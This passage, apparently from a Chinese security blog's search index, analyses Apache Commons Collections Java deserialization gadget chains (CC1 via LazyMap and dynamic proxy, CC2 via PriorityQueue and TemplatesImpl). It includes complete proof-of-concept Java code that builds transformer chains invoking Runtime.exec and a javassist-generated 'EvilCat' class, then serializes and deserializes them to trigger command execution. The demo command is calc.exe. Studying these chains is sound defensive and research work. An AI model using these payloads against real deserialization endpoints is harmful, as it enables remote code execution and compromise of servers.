\u4e2d\u7684AnnotationInvocationHandler#readObject\u65b9\u6cd5\u4e2d\u6ca1\u6709memberValue.entrySet\uff0c\u5bfc\u81f4\u94fe\u4e0d\u80fd\u987a\u7545\u8fd0\u884c\u3002","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#lazymap","text":"ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec()","title":"LazyMap\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#rce_1","text":"LazyMap\u7684\u83b7\u5f97\u65b9\u6cd5\u548cTransfromerMap\u5dee\u4e0d\u591a\u3002 Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } \u5728\u5bf9LazyMap\u4f7f\u7528get\u65b9\u6cd5\u65f6\uff0c\u5b83\u4f1a\u6267\u884cthis.factory.transform(key),\u800cthis.factory.transform\u5982\u679c\u53bb\u8ddf\u8fdb\u5206\u6790\u7684\u8bdd\uff0c\u5b9e\u8d28\u4e0a\u5c31\u662f\u8c03\u7528\u6211\u4eec\u5728decorate\u4f20\u8fdb\u53bb\u7684Transformer\u7c7b\u3002","title":"RCE\u539f\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#_6","text":"LazyMap\u7684\u89e6\u53d1\u70b9\u4e5f\u5728 AnnotationInvocationHandler \u4e2d\uff0c\u4f46\u4e0d\u662f\u5728readObject\u65b9\u6cd5\uff0c\u800c\u662f\u5728invoke\u65b9\u6cd5\u3002invoke\u65b9\u6cd5\u4e2d\u6709\u4e00\u884c Object var6 = this.memberValues.get(var4); \u5176\u4e2dthis.memberVales\u662f\u5728\u6784\u9020\u65b9\u6cd5\u4e2d\u5b9a\u4e49\u4e3a\u4f20\u5165\u7684Map\u3002 \u90a3\u4e48invoke\u65b9\u6cd5\u8981\u600e\u4e48\u624d\u80fd\u89e6\u53d1\u5462\uff1f\u7b54\u6848\u662f\u52a8\u6001\u4ee3\u7406\u3002 \u719f\u6089\u52a8\u6001\u4ee3\u7406\u7684\u670b\u53cb\u80af\u5b9a\u76f4\u5230\uff0cinvoke\u65b9\u6cd5\u662f\u52a8\u6001\u4ee3\u7406\u4e2d\u7684\u4e00\u4e2a\u7279\u6b8a\u7684\u65b9\u6cd5\uff0c\u5728\u4ee3\u7406\u7c7b\u4e2d\u65e0\u8bba\u6267\u884c\u4ec0\u4e48\u65b9\u6cd5\uff0c\u5b9e\u8d28\u4e0a\u90fd\u662f\u5728\u6267\u884cinvoke\u65b9\u6cd5\u3002 \u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u662f\u9a9a\u601d\u8def\u4e86\uff1a \u6211\u4eec\u901a\u8fc7\u53cd\u5c04\u548c\u5411\u4e0a\u8f6c\u578b\u5f97\u5230\u4e00\u4e2a AnnotationInvocationHandler(Class var1, Map var2) \u5bf9\u8c61\u3002 \u6784\u5efa\u4e00\u4e2aMap\u7684\u4ee3\u7406\u7c7b\uff0c\u5176\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u521a\u521a\u5f97\u5230\u7684 AnnotationInvocationHandler \u5bf9\u8c61\uff0c\u518d\u6545\u6280\u91cd\u65bd\u5c06\u5176\u901a\u8fc7\u5411\u4e0a\u8f6c\u578b\u5f97\u5230\u4e00\u4e2a AnnotationInvocationHandler \u5bf9\u8c61\u3002\u5f53\u8be5\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u6267\u884creadObjct\u65b9\u6cd5\u65f6\uff0c\u4f1a\u6267\u884c\u4ee5\u4e0bentryset\u65b9\u6cd5 \u672c\u8d28\u4e0a\u6765\u8bf4\uff0c\u662f\u5bf9\u4e00\u4e2a\u4ee3\u7406\u7c7b\u6267\u884c\u4e86\u4e00\u4e0bentrySet\u65b9\u6cd5\uff0c\u5373\u6267\u884c\u4e86\u4ee3\u7406\u7c7b\u7684invoke\u65b9\u6cd5\uff0c\u53c8\u56e0\u4e3a\u4ee3\u7406\u7c7b\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u586b\u5165\u7684\u662f AnnotationInvocationHandler \u5bf9\u8c61\uff0c\u5176\u5185\u90e8\u5df2\u7ecf\u5199\u597d\u4e86invoke\u65b9\u6cd5\uff0c\u6240\u4ee5\u6b64\u5904\u6267\u884c\u7684\u4ee3\u7406\u7c7b\u7684invoke\u65b9\u6cd5\u5373 AnnotationInvocationHandler \u5bf9\u8c61\u7684invoke\u65b9\u6cd5\uff0c\u7ee7\u800c\u89e6\u53d1\u4e86get\u65b9\u6cd5\uff0c\u7ee7\u800c\u89e6\u53d1\u4e86\u6f0f\u6d1e\u3002\u8fd9\u662f\u4e00\u4e2a\u5f88\u5999\u7684\u5730\u65b9 \u591a\u8bf4\u65e0\u76ca\uff0c\u6574paylaod\u5427 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class test2 { public static void main(String[] args) throws Exception { ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}); Map innermap = new HashMap(); Map outermap = LazyMap.decorate(innermap, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); //\u5999\u5904 InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);//\u83b7\u5f97\u4e00\u4e2aAnnotationInvocationHandler\u5bf9\u8c61 Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);//\u521b\u5efa\u4e00\u4e2aMap\u7684\u4ee3\u7406\u7c7b\uff0c\u5176\u4ee3\u7406\u65b9\u6cd5\u4e3aAnnotationInvocationHandler\u5bf9\u8c61\u91cc\u7684invoke\u65b9\u6cd5 InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox); //\u5c06\u4ee3\u7406Map\u4f20\u5165\uff0c\u5f53\u4ee3\u7406Map\u88ab\u6267\u884c\u4efb\u4e00\u65b9\u6cd5\u65f6\uff0c\u6267\u884cinvoke\u65b9\u6cd5 // ObjectOutputStream a = new ObjectOutputStream(new FileOutputStream(\"a.bin\")); a.writeObject(handler1); ObjectInputStream b = new ObjectInputStream(new FileInputStream(\"a.bin\")); b.readObject(); } }","title":"\u89e6\u53d1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/#_7","text":"\u76ee\u7684\u5c31\u662f\u4e3a\u4e86\u6267\u884cAnnotationInvocationHandler \u7684invoke\u65b9\u6cd5\uff0c\u6211\u4eec\u901a\u8fc7\u5b9e\u4f8b\u5316\u4e00\u4e2aAnnotationInvocationHandler\uff08A1\uff09 \u7c7b\u5e76\u5728\u5b9e\u4f8b\u5316\u65f6\u7684\u53c2\u6570\u4e2d\u52a0\u5165\u4f20\u5165\u4e86LazyMap\u7684AnnotationInvocationHandler\uff08AP\uff09 \u7c7b\u7684\u52a8\u6001\u4ee3\u7406\uff0c\u5728A1\u6784\u9020\u65b9\u6cd5\u4e2d\u4f1a\u6709\u4e00\u4e2aAP.entryset\u7684\u4ee3\u7801\uff0c\u4ece\u800c\u89e6\u53d1\u7684AP.invoke\u3002 \u548cTransformMap\u4e00\u6837\u5728commons-collections 4 \u7248\u672c\u4e2d\u53ef\u89c1\uff0cLazyMap\u7684decorate\u65b9\u6cd5\u88ab\u5220\u9664\uff0c\u5bfc\u81f4\u8fd9\u4e2a\u94fe\u4e0d\u80fd\u6b63\u5e38\u6267\u884c\u3002","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%202/Apache-Commons-Collections%202/","text":"Apache-Commons-Collections 2 \u76ee\u5f55 \u7248\u672c \u73af\u5883 \u5229\u7528\u94fe1 POC\u5206\u6790 1 POC\u5206\u6790 2 \u5229\u7528\u94fe2 TemplatesImpl \u7c7b\u751f\u6210 POC\u5206\u6790 cc\u94fe2 \u4e3b\u8981\u662fPriorityQueue\u548ccommons-collections-4.0 \u7ec4\u4ef6 \u9020\u6210\u7684Gadget\u3002 PriorityQueue \u662f\u4e00\u4e2a\u7528\u4e8e\u5927\u5c0f\u6392\u5e8f\u7684\u7c7b\uff0c\u5b83\u4f1a\u5c06\u4f20\u5165\u7684\u6570\u503c\u8fdb\u884c\u5927\u5c0f\u6392\u5e8f\u3002 \u7248\u672c CommonsCollections 4.0 \u9700\u8981\u6709 javasist \u4f9d\u8d56 JDK\u7248\u672c\u6682\u65e0\u9650\u5236 \u73af\u5883 pom.xml <dependency> <groupId>org.apache.commons</groupId> <artifactId>commons-collections4</artifactId> <version>4.0</version> </dependency> \u5229\u7528\u94fe1 PriorityQueue +ChianedTransfomer+\u53cd\u5c04\u4fee\u6539\u5c5e\u6027 ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator(); TransformingComparator.compare() //TransformingComparator cc4.0\u540e\u624d\u80fd\u5b9e\u73b0\u4e86\u5e8f\u5217\u5316\u63a5\u53e3 InvokerTransformer.transform() Method.invoke() Runtime.exec() POC import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; public class Main { public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"calc.exe\"})}); TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } \u76f4\u63a5\u8ddf\u7740POC\u8c03\u8bd5\u3002 \u6211\u4eec\u6839\u636e\u5229\u7528\u94fe\u8ddf\u8fdb\u5230PriorityQueue.readObject \u8fd9\u91cc\u5148\u5faa\u73af\u8c03\u7528readObject\u5c06\u53cd\u5e8f\u5217\u5316\u7ed3\u679c\u653e\u5165queue\u6570\u7ec4\uff0c\u7136\u540e\u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u6700\u540e\u8c03\u7528\u4e86\u4e00\u4e2aheapify()\u65b9\u6cd5\uff0c\u6211\u4eec\u8ddf\u8fdb\u3002 \u8fd9\u91cc\u7684\u610f\u601d\u5bf9\u6211\u4eec\u6765\u8bf4\u4fbf\u662f\uff0c\u5982\u679csize\u5927\u4e8e1\u4fbf\u8c03\u7528siftDown\u65b9\u6cd5\u5904\u7406queue\u6570\u7ec4\u3002\u8ddf\u8fdbsiftDown \u4f1a\u53d1\u73b0\u6b64\u5904\u4f1a\u5224\u65adcomparator\u662f\u5426\u5b58\u5728\uff0c\u82e5\u5b58\u5728\u5219\u8c03\u7528siftDownUsingComparator\u3002\u94fe\u4e2d\u662f\u9700\u8981\u8ddf\u8fdbsiftDownUsingComparator\u65b9\u6cd5\u3002 siftDownUsingComparator\u91cc\u6709\u4e2acomparator.compare(x, (E) c),\u5176\u4e2d\u8fd9\u4e2ax\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u5c31\u662f\u6211\u4eec\u5f80queue\u4e2dput\u7684\u503c\u3002\u8ddf\u8fdbcompare\u65b9\u6cd5 \u53ef\u4ee5\u53d1\u73b0\u662f\u8c03\u7528\u4e86\u5f53\u524dtransformer\u6307\u5b9a\u7684\u7c7b\u7684transform\u65b9\u6cd5\uff0c\u800c\u5f53\u524dtransform\u6309\u7167POC\u4e2d\u6765\u770b\u4fbf\u662fChainedTransformer chain\uff0c\u4e8e\u662f\u6b64\u5904\u4fbf\u4f1a\u8c03\u7528ChainedTransformer\u7684transform\u65b9\u6cd5\uff0c\u6211\u4eec\u5728ChainedTransformer\u4e2d\u5199\u5165\u7684\u547d\u4ee4\u5c31\u4f1a\u88ab\u6267\u884c\u4e86\u3002 \u8fd9\u4fbf\u662f\u8fd9\u4e2a\u94fe\u7684\u5927\u4f53\u72b6\u51b5\uff0c\u4f46\u662f\u8fd9\u4e2aPOC\u4e2d\u4ecd\u7136\u6709\u4e00\u4e9b\u7ec6\u8282\u9700\u8981\u63a8\u6572\u3002 POC\u5206\u6790 1 TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); \u8fd9\u91cc\u5411queue\u4e2dadd\u4e86\u4e24\u4e2a\u5143\u7d20\uff0c\u8fd9\u91ccadd\u4e86\u4e24\u4e2a\u5143\u7d20\u7684\u610f\u4e49\u662f\u8fd9\u6837\u7684\uff1a \u5728heapify\u4f1a\u5224\u65adqueue\u4e2d\u7684\u5bf9\u8c61\u6570\u91cf\u662f\u5426\u5927\u4e8e1\uff0c\u53ea\u6709\u5927\u4e8e1\u624d\u4f1a\u6267\u884csiftDown\u65b9\u6cd5\u3002 POC\u5206\u6790 2 TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u5728POC\u6b64\u5904\u5728\u5b9e\u4f8b\u5316PriorityQueue\u65f6\u5e76\u6ca1\u6709\u4f20\u5165comparotor\uff0c\u800c\u662f\u5728\u540e\u9762\u4f7f\u7528\u53cd\u5c04\u7ed9comparator\u53d8\u91cf\u8d4b\u503c\u3002\u6211\u4eec\u8ddf\u8fdbqueue.add\u4fbf\u53ef\u4e00\u89c8\u7a76\u7adf add\u5728\u5b9e\u9645\u4e0a\u662f\u8c03\u7528\u4e86offer\u65b9\u6cd5\uff0c\u8ddf\u8fdboffer\u65b9\u6cd5 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2aoffer\u65b9\u6cd5\u4e5f\u8c03\u7528\u4e86siftUp\u8fd9\u4e2a\u65b9\u6cd5 \u8ddf\u8fdb\u540e\u81ea\u7136\u662f\u6765\u5230\u6b64\u5904\uff0c\u5982\u679ccomparator\u5b58\u5728\u5b83\u4fbf\u4f1a\u8d70\u4e0a\u9762\u7684\u5206\u652f\uff0c\u8c03\u7528transformer\u65b9\u6cd5\uff0c\u8d70\u4e0b\u9762\u4fbf\u662f\u8fdb\u884c\u8d4b\u503c\u64cd\u4f5c\u3002 \u5047\u5982\u6b64\u65f6comparator\u5b58\u5728\u8d70\u4e86\u4e0a\u9762\u7684\u5206\u652f\uff0c \u4fbf\u4f1a\u5728\u6b64\u884c\u4ea7\u751f\u62a5\u9519\uff0c\u8fd9\u91cc\u7684\u903b\u8f91\u662f\u5c06queue\u6570\u7ec4\u4e2d\u7684\u4e24\u4e2a\u503c\u8fdb\u884ctransform\u5904\u7406\u7136\u540e\u8fdb\u884c\u5927\u5c0f\u6bd4\u8f83\u4ee5\u6392\u5e8f\uff0c\u4f46\u662f\u8fd9\u91cc\u4e24\u4e2atransform\u65b9\u6cd5\u8fd4\u56de\u7684\u7ed3\u679c\u5747\u4e3aProccessImpl\u5bf9\u8c61\uff0c\u4e0d\u80fd\u88abcompare\u65b9\u6cd5\u8c03\u7528\u8fdb\u884c\u5927\u5c0f\u6bd4\u8f83\uff0c\u6240\u4ee5\u4f1a\u4ea7\u751f\u62a5\u9519\u3002\u5bfc\u81f4\u6211\u4eec\u540e\u9762\u7684\u5e8f\u5217\u5316\u64cd\u4f5c\u4e0d\u80fd\u987a\u5229\u6267\u884c\uff0c\u65e0\u6cd5\u4ea7\u751fpayload\u3002 \u5229\u7528\u94fe2 \u94fe2\u7528\u5230\u4e86PriorityQueue +TemplatesImpl +InvokerTransformer\u548cjavassist\u6280\u672f\u3002 javassist \u53ef\u4ee5\u7528\u6765\u52a8\u6001\u4fee\u6539java\u5b57\u8282\u7801\uff0c\u76f8\u5173\u7ec6\u8282\u8fd9\u91cc\u5c31\u4e0d\u7ec6\u8bf4\u4e86\uff0c\u6211\u7684\u535a\u5ba2\u548c\u7f51\u4e0a\u5747\u6709\u5927\u91cf\u6587\u7ae0\u3002 ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() EvilClass.newInstance() \u5173\u4e8eTemplatesImpl \uff0c\u5b83\u4e5f\u662f7u21\u94fe\u4e2d\u4e0d\u53ef\u6216\u7f3a\u7684\u4e00\u4e2a\u73af\u8282\uff0c\u5b83\u914d\u5408javassist\u8d77\u5230\u4efb\u610f\u7c7b\u751f\u6210\u7684\u4f5c\u7528\uff0c\u5728\u8be5\u6761\u94fe\u4e2d\u53ef\u4ee5\u518d\u914d\u5408invokerTransformer\u6765\u8fbe\u5230\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\u3002 POC import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); //cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"blckder02\"); setFieldValue(templates, \"_class\", null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2.bin\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } TemplatesImpl \u7c7b\u751f\u6210 \u6211\u4eec\u5148\u6765\u770b\u4e00\u770bTemplatesImpl \u662f\u5982\u4f55\u8fdb\u884c\u7c7b\u751f\u6210\u7684\u3002 \u9996\u5148TemplatesImpl\u7c7b\u4e2d\u6709\u4e2a\u65b9\u6cd5defineTransletClasses\uff0c\u5b83\u7684\u4e3b\u8981\u4ee3\u7801\u5982\u4e0b private byte[][] _bytecodes = (byte[][])null; private void defineTransletClasses() throws TransformerConfigurationException { if (this._bytecodes == null) { ..... } else { TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader()); } }); try { int classCount = this._bytecodes.length; this._class = new Class[classCount]; for(int i = 0; i < classCount; ++i) { this._class[i] = loader.defineClass(this._bytecodes[i]); \\\\\u5c06_bytecodes\u4e2d\u7684\u6240\u6709\u5b57\u8282\u901a\u8fc7defineClass\u8f6c\u5316\u4e3a\u4e00\u4e2a\u7c7b Class superClass = this._class[i].getSuperclass(); if (superClass.getName().equals(ABSTRACT_TRANSLET)) { this._transletIndex = i; } else { this._auxClasses.put(this._class[i].getName(), this._class[i]); } } } \u4e5f\u5c31\u662f\u8bf4\u901a\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u5c06_bytecodes\u6570\u7ec4\u4e2d\u7684\u5b57\u8282\u8fd8\u539f\u6210\u4e00\u4e2a\u7c7b\uff0c\u5b58\u50a8\u5230_class\u53d8\u91cf\u4e2d\u3002\u63a5\u4e0b\u6765\u5982\u679c\u6211\u4eec\u80fd\u627e\u5230\u8c03\u7528defineTransletClasses\u65b9\u6cd5\u5e76\u6267\u884c\u4e86_class[].newinstance() \u8fd9\u6837\u7684\u7684\u4ee3\u7801\u7684\u65b9\u6cd5\uff0c\u5c31\u80fd\u5b9e\u4f8b\u5316\u4ece\u5b57\u8282\u5f97\u5230\u7684\u7c7b\u4e86\uff0c\u4ece\u800c\u5c31\u80fd\u6267\u884c\u7c7b\u4e2d\u7684\u9759\u6001\u4ee3\u7801\u5757\u548c\u6784\u9020\u51fd\u6570\u4e86\uff01 \u6240\u4ee5\u63a5\u4e0b\u6765\u6211\u4eec\u9700\u8981\u53bb\u5bfb\u627e\u8fd9\u79cd\u65b9\u6cd5\u3002 \u901a\u8fc7\u641c\u7d22defineTransletClasses\uff0c\u6211\u4eec\u627e\u5230\u4e86\u6709\u5982\u4e0b\u4e09\u4e2a\u65b9\u6cd5\u8c03\u7528\u4e86defineTransletClasses\u65b9\u6cd5\uff1a getTransletInstance getTransletIndex getTransletClasses \u5176\u4e2d\uff0cgetTransletInstance\u65b9\u6cd5\u662f\u552f\u4e00\u7b26\u5408\u201c\u8c03\u7528\u4e86defineTransletClasses\u4e14\u6709_class[].newinstance()\u201d\u7684\u65b9\u6cd5\uff0c\u5176\u4ee3\u7801\u5982\u4e0b private Translet getTransletInstance() throws TransformerConfigurationException { ErrorMsg err; try { if (this._name == null) { return null; } else { if (this._class == null) { this.defineTransletClasses(); } AbstractTranslet translet = (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\\\here,\u6ce8\u610f\u6b64\u5904\u751f\u6210\u7684\u7c7b\u5bf9\u8c61\u5e94\u8be5\u662fAbstractTranslet\u6216\u5176\u5b50\u7c7b translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(this._useServicesMechanism); if (this._auxClasses != null) { translet.setAuxiliaryClasses(this._auxClasses); } return translet; } \u90a3\u4e48\uff0cgetTransletInstance\u662f\u4e00\u4e2aprivate\u65b9\u6cd5\uff0c\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\u5b83\uff0c\u5728\u90a3\u91cc\u80fd\u53bb\u8c03\u7528\u5b83\u5462\uff1f\u7b54\u6848\u662fnewTransformer\u65b9\u6cd5 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer = new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory); \\\\here \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 } \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7javassist\u52a8\u6001\u63a7\u5236_bytecodes\u5c5e\u6027\u7684\u503c\uff0c\u7136\u540e\u901a\u8fc7InvokerTransfomer\u8c03\u7528TemplatesImpl.newTransfomer\u6765\u628a\u6211\u4eec\u901a\u8fc7javassist\u5f97\u5230\u7684\u5b57\u8282\u7801\u5b9e\u4f8b\u5316\uff0c\u5728\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u8c03\u7528\u5176\u6784\u9020\u51fd\u6570\u3002 POC\u5206\u6790 Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); \u8fd9\u91cc\u662f\u5148\u83b7\u53d6InvokerTransformer\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u7136\u540e\u5411\u6784\u9020\u65b9\u6cd5\u4f20\u5165newTransformer\u6765\u5b9e\u4f8b\u5316\u4e00\u4e2aInvokerTransformer\u65b9\u6cd5\u3002 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); //cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"blckder02\"); setFieldValue(templates, \"_class\", null); \u8fd9\u91cc\u662f\u901a\u8fc7javassist\u52a8\u6001\u5b9e\u73b0\u4e86\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u4e3a\u6267\u884c\u8ba1\u7b97\u5668\u7684\u7c7b\uff0c\u5c06\u5176\u8f6c\u5316\u4e3a\u5b57\u8282\u7801\u4fdd\u5b58\uff0c\u7136\u540e\u5728\u5b9e\u4f8b\u5316TemplatesImpl\u65f6\u4f20\u5165\u5176_bytecodes\u53d8\u91cf\uff0c\u8fd9\u91cc\u8fd8\u5fc5\u987b\u4e3a_name\u8d4b\u503c\uff0c_class\u6211\u6d4b\u8bd5\u7684\u65f6\u5019\u4e5f\u4e0d\u7528\u8d4b\u503c\uff0c\u4f46\u662f\u52a0\u4e0a\u6700\u597d\uff1f\u6211\u6ca1\u6709\u7ec6\u8ddf\u3002 Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field 